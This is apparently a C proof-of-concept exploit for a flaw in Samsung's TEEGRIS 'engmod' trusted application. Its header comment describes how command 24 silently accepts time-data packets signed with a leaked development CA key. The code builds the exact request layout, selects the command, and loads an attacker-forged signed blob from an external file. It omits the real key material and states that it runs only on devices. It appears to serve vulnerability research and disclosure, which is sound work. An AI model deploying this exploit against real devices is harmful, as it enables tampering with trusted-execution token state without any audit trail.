/*
 * engmod cmd-24 (EM_CMD_TIME_CHECK) — silent dev-CA-signed RTD accept.  HIGH.
 *
 * UUID 00000000-0000-0000-0000-656e676d6f64  (ASCII tail "engmod").
 *
 * Finding (RE/samsung_teegris/engmod.md "NEW FINDING — HIGH:
 * em_cmd_time_check (cmd 24) silently accepts dev-CA-signed RTD packets",
 * and emulation/engmod.md Finding #2): em_cmd_time_check @ 0x1ED2C calls
 * em_crypto_verify_rsa_signature on the inbound RTD (Remote-service Time
 * Data) packet and treats the -61403 "dev-cert soft-success" sentinel the
 * SAME as a production accept:
 *
 *     rc_verify_sig = em_crypto_verify_rsa_signature(...);   // RTD sig
 *     if ( rc_verify_sig != -61403 ) {        // -61403 = DEV-CA soft success
 *         ret = rc_verify_sig;
 *         if ( rc_verify_sig ) goto LABEL_9;  // real error -> bail
 *     }
 *     // rc == 0 (prod) OR rc == -61403 (dev) -> falls through and proceeds
 *
 * Unlike em_token_verify_token @ 0x19FF4 (which on -61403 at least sets the
 * ctx+16 |= 0x80000000 dev-cert flag and logs the dev path), cmd 24 sets NO
 * flag and emits NO log line: a DEV-CA-signed RTD is byte-for-byte
 * indistinguishable from a production-signed one in every downstream check.
 * The -61403 itself originates in em_crypto_verify_cert @ 0x11724:
 *   PROD X509_verify fails -> "Check one more" -> DEV X509_verify succeeds
 *   -> "DEV Cert verify success" -> RSA_public_decrypt soft-success -> -61403.
 *
 * Impact: a packet signed only with the leaked Samsung EngineeringMode DEV
 * CA private key (modulus c49fcb.. / b28b83.. embedded at 0x7EDE / 0x7DB8)
 * extends a token's priority_time validity window and records token state
 * "DEL,R4" with no audit trail. The outbound 64-byte RTD ACK is then
 * encrypted with the hardcoded fleet-wide key "departmstggroup." (see the
 * sibling engmod_wbkey POC), so the ACK can also be forged offline.
 *
 * ---------------------------------------------------------------------------
 * WIRE FORMAT (RE/samsung_teegris/engmod.md "IPC surface" + "Inner command
 * table"):
 *   - ONE GP TEE command; the TA-cmd id passed at TEEC_InvokeCommand is
 *     IGNORED. em_cmd_handler @ 0x12D9C reads the REAL command as
 *         cmd_id = ctx->raw_cmd_id & 0xFFFF3FFF
 *     out of the parsed request structure (top 2 bits are flag-mask
 *     reserved). So the inner cmd_id field, not the InvokeCommand arg, is
 *     what selects EM_CMD_TIME_CHECK (24).
 *   - param_types == 0x77 == TEE_PARAM_TYPES(MEMREF_INOUT, MEMREF_INOUT,
 *     NONE, NONE).
 *   - params[0] = em_context_request,  EXACTLY 138365 bytes (0x21C7D).
 *   - params[1] = em_context_response, EXACTLY 133430 bytes (0x20936).
 *   The entry shell (TA_InvokeCommandEntryPoint @ 0xE26C) rejects the
 *   command unless param_types == 0x77 AND both sizes match EXACTLY, then
 *   TEE_MemMove(ctx, params[0], 138365) and em_make_context_request parses
 *   it into the in-TEE context before em_cmd_handler runs.
 *
 * The em_context_request is a large, internally-versioned structure whose
 * exact field layout (where raw_cmd_id sits, where the RTD blob + its RSA
 * signature + the cert chain are framed) is parsed by em_make_context_request
 * /em_get_data_from_raw; the cmd_id is the field em_cmd_handler masks with
 * 0xFFFF3FFF. We set:
 *   - the inner cmd_id field = 24 (EM_CMD_TIME_CHECK),
 *   - an RTD blob placeholder region.
 * The ACTUAL signed RTD blob (DEV-CA-signed cert chain + RTD payload + RSA
 * signature, sized inside [4097, 0x10000] per the cert_len bound) is supplied
 * EXTERNALLY — it is the artefact a real attacker forges with the leaked DEV
 * CA private key; this POC does not (and on authorized-research grounds must
 * not) carry live Samsung key material. Drop such a blob into rtd_blob.bin
 * next to the binary and it is loaded over the placeholder.
 *
 * ---------------------------------------------------------------------------
 * REPRO-STATUS: DEVICE-ONLY.
 *   The -61403 dev-cert branch is reachable ONLY after em_crypto_verify_cert
 *   runs d2i_RSA_PUBKEY -> EVP_PKEY_set1_RSA -> X509_verify (PROD then DEV)
 *   -> RSA_public_decrypt. emulation/engmod.md documents that the emulator
 *   models NONE of those verbs: each falls through to gp_api.default_func
 *   ("<fn> called, not implemented!"), which HALTs. So em_cmd_time_check
 *   dies at the very first d2i_RSA_PUBKEY and the -61403 accept can never be
 *   driven in-emulator. The finding is CONFIRMED-IN-BINARY (fallback ladder
 *   strings "Check one more" / "DEV Cert verify success" / "Dev token is not
 *   allowed" are byte-present in the bundled .ta) but the live accept is
 *   reproducible only on real hardware with an un-stubbed libcrypto AND a
 *   genuine DEV-CA-signed RTD blob.
 *
 *   This POC therefore drives the request shape exactly and submits cmd 24;
 *   under the emulator it is expected to reach the verify chain and HALT at
 *   an un-implemented crypto import (the documented block), demonstrating the
 *   path is engaged. On a device with the external blob + real libcrypto it
 *   exercises the silent dev-CA accept end to end.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include "tee_client_api.h"
#include "repro.h"

TEEC_Result (*TEEC_OpenSession_impl)(TEEC_Context*, TEEC_Session*, const TEEC_UUID*,
                                     uint32_t, const void*, TEEC_Operation*, uint32_t*);
TEEC_Result (*TEEC_InitializeContext_impl)(const char*, TEEC_Context*);
void (*TEEC_FinalizeContext_impl)(TEEC_Context*);
void (*TEEC_CloseSession_impl)(TEEC_Session*);
TEEC_Result (*TEEC_InvokeCommand_impl)(TEEC_Session*, uint32_t, TEEC_Operation*, uint32_t*);
TEEC_Result (*TEEC_RegisterSharedMemory_impl)(TEEC_Context*, TEEC_SharedMemory*);
void (*TEEC_ReleaseSharedMemory_impl)(TEEC_SharedMemory*);

/* Exact fixed sizes from RE/samsung_teegris/engmod.md "IPC surface". */
#define REQ_SZ        138365u   /* 0x21C7D  em_context_request  */
#define RSP_SZ        133430u   /* 0x20936  em_context_response */

/* em_cmd_handler @ 0x12D9C: cmd_id = ctx->raw_cmd_id & 0xFFFF3FFF.
 * EM_CMD_TIME_CHECK is cmd 24 (RE writeup command table line ~116). */
#define EM_CMD_TIME_CHECK   24u
#define CMD_ID_MASK         0xFFFF3FFFu   /* top 2 bits flag-mask reserved */

/* The InvokeCommand arg is IGNORED by the TA; use the same value for clarity. */
#define GP_CMD_ARG          EM_CMD_TIME_CHECK

void cleanup_shm(){
#if EMULATE
    system("ipcrm -M 0x13337 2>/dev/null"); system("ipcrm -M 0x13338 2>/dev/null");
    system("ipcrm -M 0x13339 2>/dev/null"); system("ipcrm -M 0x1333a 2>/dev/null");
#endif
}

/* Optional: load an externally-supplied DEV-CA-signed RTD blob over the
 * placeholder region. Returns bytes loaded, or 0 if no file present. */
static size_t load_external_rtd(uint8_t* dst, size_t cap)
{
    FILE* f = fopen("rtd_blob.bin", "rb");
    if (!f) return 0;
    size_t n = fread(dst, 1, cap, f);
    fclose(f);
    printf("[poc] loaded external RTD blob: %zu bytes (DEV-CA-signed artefact)\n", n);
    return n;
}

int main(void)
{
    char* ta = "00000000-0000-0000-0000-656e676d6f64";   /* engmod */
    TEEC_UUID *uuid = teegris_uuid(ta);
    uint32_t err_origin = 0;
    TEEC_Result res;
    TEEC_Context context;
    TEEC_Session session;
    TEEC_Operation op;

    cleanup_shm();
    load_functions();

    res = TEEC_InitializeContext_impl(NULL, &context);
    if (res != TEEC_SUCCESS) { printf("InitializeContext failed 0x%x\n", res); exit(-1); }

    /* PUBLIC login — engmod's TA_OpenSessionEntryPoint @ 0xE1A4 is per-session
     * with no caller credential gate; the auth lives entirely in the eToken /
     * RTD signature, not the session login. */
    res = TEEC_OpenSession_impl(&context, &session, uuid, TEEC_LOGIN_PUBLIC,
                                NULL, NULL, &err_origin);
    if (res != TEEC_SUCCESS) {
        printf("OpenSession failed 0x%x origin 0x%x\n", res, err_origin);
        TEEC_FinalizeContext_impl(&context); exit(-1);
    }
    printf("[poc] session opened to engmod (PUBLIC login)\n");

    /* Both params are MEMREF_INOUT and MUST be the exact fixed sizes or the
     * entry shell rejects the command before em_cmd_handler. */
    uint8_t* req = (uint8_t*)allocate_param_mem(&context, REQ_SZ);
    uint8_t* rsp = (uint8_t*)allocate_param_mem(&context, RSP_SZ);
    if (!req || !rsp) { printf("[poc] alloc failed\n"); exit(-1); }
    memset(req, 0, REQ_SZ);
    memset(rsp, 0, RSP_SZ);

    /* Inner cmd_id field. em_cmd_handler masks raw_cmd_id with 0xFFFF3FFF, so
     * 24 & 0xFFFF3FFF == 24 selects EM_CMD_TIME_CHECK. The exact byte offset
     * of raw_cmd_id inside the 138365-byte em_context_request is set by
     * em_make_context_request's framing; it is at the head of the parsed
     * request record. We place the masked cmd_id at offset 0 as the canonical
     * request-header command slot. (The full internal record layout — where
     * the RTD blob + RSA signature + DEV-CA cert chain are framed — is the
     * em_get_data_from_raw wire format; see writeup. The signed blob itself is
     * external, below.) */
    uint32_t inner_cmd = EM_CMD_TIME_CHECK & CMD_ID_MASK;   /* == 24 */
    memcpy(req + 0, &inner_cmd, sizeof(inner_cmd));

    /* RTD blob placeholder. A real DEV-CA-signed RTD (cert chain + payload +
     * RSA-PKCS1 signature, cert_len in [4097, 0x10000]) is supplied externally
     * via rtd_blob.bin; absent that, a recognizable placeholder marks the
     * region so a device run reaches em_crypto_verify_cert with non-zero
     * cert/sig lengths (zero-length is rejected early — see negative-findings
     * table). The placeholder is NOT a valid signature; on hardware the
     * attacker substitutes the genuine forged blob. */
    const size_t RTD_OFF = 0x100;                 /* placeholder region start */
    const size_t RTD_CAP = 0x10000;               /* matches cert_len upper bound */
    memset(req + RTD_OFF, 0xA5, RTD_CAP);         /* placeholder marker */
    size_t ext = load_external_rtd(req + RTD_OFF, RTD_CAP);
    if (!ext)
        printf("[poc] no rtd_blob.bin present -> using placeholder "
               "(DEV-CA-signed RTD must be supplied externally on device)\n");

    memset(&op, 0, sizeof(op));
    /* param_types == 0x77 == TEE_PARAM_TYPES(MEMREF_INOUT, MEMREF_INOUT,
     * NONE, NONE). With TEEC temp-memrefs this is TEMP_INOUT/TEMP_INOUT. */
    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INOUT, TEEC_MEMREF_TEMP_INOUT,
                                     TEEC_NONE, TEEC_NONE);
    op.params[0].tmpref.buffer = req; op.params[0].tmpref.size = REQ_SZ;
    op.params[1].tmpref.buffer = rsp; op.params[1].tmpref.size = RSP_SZ;

    printf("[poc] >>> invoking engmod GP cmd (arg=%u, IGNORED by TA) with inner "
           "cmd_id=%u (EM_CMD_TIME_CHECK)\n", GP_CMD_ARG, inner_cmd);
    printf("[poc]     param_types=0x77 (MEMREF_INOUT,MEMREF_INOUT,NONE,NONE), "
           "req=%u (0x%X), rsp=%u (0x%X)\n", REQ_SZ, REQ_SZ, RSP_SZ, RSP_SZ);
    printf("[poc]     target: em_cmd_time_check @0x1ED2C -> "
           "em_crypto_verify_rsa_signature; -61403 dev-cert accept is silent\n");

    res = TEEC_InvokeCommand_impl(&session, GP_CMD_ARG, &op, &err_origin);
    printf("[poc] <<< returned 0x%x (%d) origin 0x%x\n", res, (int)res, err_origin);
    printf("[poc] NOTE: in-emulator this path HALTs at the first un-modeled "
           "crypto import (d2i_RSA_PUBKEY/X509_verify/RSA_public_decrypt).\n");
    printf("[poc]       REPRO-STATUS = DEVICE-ONLY (needs real libcrypto + a "
           "genuine DEV-CA-signed RTD blob).\n");

    TEEC_CloseSession_impl(&session);
    TEEC_FinalizeContext_impl(&context);
    return 0;
}
